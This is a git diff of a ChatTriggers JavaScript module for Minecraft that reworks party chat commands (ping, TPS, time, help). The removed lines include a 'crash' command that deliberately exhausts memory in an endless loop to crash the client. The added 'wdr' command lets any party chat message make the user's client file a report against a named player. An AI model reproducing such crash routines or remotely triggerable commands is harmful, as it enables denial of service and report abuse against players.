@@ -1,19 +1,18 @@
-import config from "../../../config";
-import { partyMsg } from "../../../utils/Functions";
+import { message_chumu, message_help, modMsg, partyMsg } from "../../../utils/Functions";
+import chatCommandsConfig from "../config";
 
 let tps = 20;
 let pastDate = 0;
 let ping = 0;
 let lastPing = 0;
 
+// !tps
 register("packetReceived", () => {
-    const delta = Date.now() - pastDate;
-    const instantTps = Math.min(20000 / delta, 20);
-    const alpha = 2 / 11;
-    tps = instantTps * alpha + tps * (1 - alpha);
+    tps = Math.min(20000 / (Date.now() - pastDate), 20) * 2/11 + tps * 9/11;
     pastDate = Date.now();
 }).setFilteredClass(Java.type("net.minecraft.network.play.server.S03PacketTimeUpdate"));
 
+// !ping send 
 register("step", () => {
     if (lastPing === 0) {
         const C16 = Java.type("net.minecraft.network.play.client.C16PacketClientStatus");
@@ -22,7 +21,7 @@ register("step", () => {
         lastPing = Date.now();
     }
 }).setDelay(3);
-
+// !ping receive
 register("packetReceived", () => {
     if (lastPing !== 0) {
         ping = Date.now() - lastPing;
@@ -33,39 +32,55 @@ register("packetReceived", () => {
     Java.type("net.minecraft.network.play.server.S37PacketStatistics")
 ]);
 
-export default {
+export default function (player, command, args) {
+    switch (command) {
+        case "help":
+        case "h":
+            if (!chatCommandsConfig.help) return true;
+            message_help();
+            return true;
 
-    help(player, args) {
-        if (!config.help) return;
-        partyMsg("i cant help u");
-        ChatLib.chat("§d[DEBUG] Help Called")
-    },
+        case "chumu":
+        case "ca":
+            if (!chatCommandsConfig.chumu) return true;
+            message_chumu();
+            return true;
 
-    ping(player, args) {
-        if (!config.ping) return;
-        if (ping === 0 || ping > 10000) {
-            partyMsg(`Ping: Pinging...`);
-        } else {
-            partyMsg(`Ping: ${ping}ms`);
-        }
-    },
+        case "ping":
+            if (!chatCommandsConfig.ping) return true;
+            if (ping === 0 || ping > 10000) {
+                modMsg(`Ping: Pinging...`);
+            } else {
+                partyMsg(`Ping ➸ ${ping}ms`);
+            };
+            return true;
 
-    tps(player, args) {
-        if (!config.tps) return;
-        partyMsg(`TPS: ${tps.toFixed(1)}`);
-    },
+        case "tps":
+            if (!chatCommandsConfig.tps) return true;
+            partyMsg(`TPS ➸ ${tps.toFixed(1)}`);
+            return true;
 
-    coords(player, args) {
-        const x = Math.floor(Player.getX());
-        const y = Math.floor(Player.getY());
-        const z = Math.floor(Player.getZ());
-        partyMsg(`x: ${x},  y: ${y},  z: ${z}`);
-    },
+        case "time":
+            if (!chatCommandsConfig.time) return true;
+            const now = new Date();
+            const week = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
+            const day = week[now.getDay()];
+            const formatted =
+                now.getFullYear() + "/"
+                + String(now.getMonth() + 1).padStart(2, "0") + "/"
+                + String(now.getDate()).padStart(2, "0") + " "
+                + String(now.getHours()).padStart(2, "0") + ":"
+                + String(now.getMinutes()).padStart(2, "0") + ":"
+                + String(now.getSeconds()).padStart(2, "0")
+                + ` (${day})`;
+            partyMsg(formatted);
+            return true;
 
-    crash(player, args) {
-        if (Player.getName() !== "Okinaw_a") return;
-        const arr = [];
-        while (true) arr.push("CTCrash".repeat(100000));
+        case "wdr":
+            if (!chatCommandsConfig.wdr) return true;
+            const target = args.length > 0 && args[0] ? args[0] : "Okinaw_a";
+            ChatLib.command(`wdr ${target}`);
+            return true;
     }
-
-};
+    return false;
+}
